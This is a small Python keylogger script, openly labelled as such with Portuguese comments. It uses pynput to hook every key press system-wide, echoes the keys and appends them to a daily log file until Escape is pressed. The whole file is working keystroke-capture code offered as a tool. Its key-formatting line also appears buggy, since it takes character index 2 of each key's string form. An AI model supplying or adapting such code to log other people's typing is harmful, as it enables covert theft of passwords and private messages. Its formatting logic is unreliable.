'''
    Simple Python Keylogger
    written in: Python
    written by: Murilo Melo from Aadarsh
    version: 1.0.x / Archived
'''

import pynput, datetime
from pynput.keyboard import Key, Listener, Controller
# Criação do controlador de teclado
teclado = Controller()
caps = False

# Gerenciamento de log por meio de datas
def write_logs(chave):
    DTtime = datetime.datetime.now()
    filename = "log" + "{}-{}-{}".format(DTtime.year, DTtime.month, DTtime.day) + ".txt"
    # Abertura do arquivo de log de acordo com a data para escrita
    with open (filename, "a") as file:
        file.write(chave)
        file.close()

# Key listener
def pega_chave(chave):
    chave_formatacao = str(chave)
    print(chave)
    # Formatação básica para o log, pode ser trocada por um switch ou algo semelhante
    if chave == Key.enter:
        write_logs("\n")
    elif chave == Key.space:
        write_logs(" ")
    elif chave == Key.caps_lock:
        print("[CAPS Lock]")
    elif chave == Key.esc:
        write_logs("\n[Esc]\n")
    elif chave == Key.shift or chave == Key.shift_l or chave == Key.shift_r:
        write_logs("\n[Shift]\n")
    else:
        write_logs(chave_formatacao[2])

# Interrupção do log de teclas
def para_logging(chave):
    if chave == Key.esc:
        return False
    elif chave == Key.shift or chave == Key.shift_l or chave == Key.shift_r:
        write_logs("\n[!Shift]\n")

# Execução do log de teclas ao fim do documento
with Listener(on_press=pega_chave,on_release=para_logging) as listen:
    listen.join()
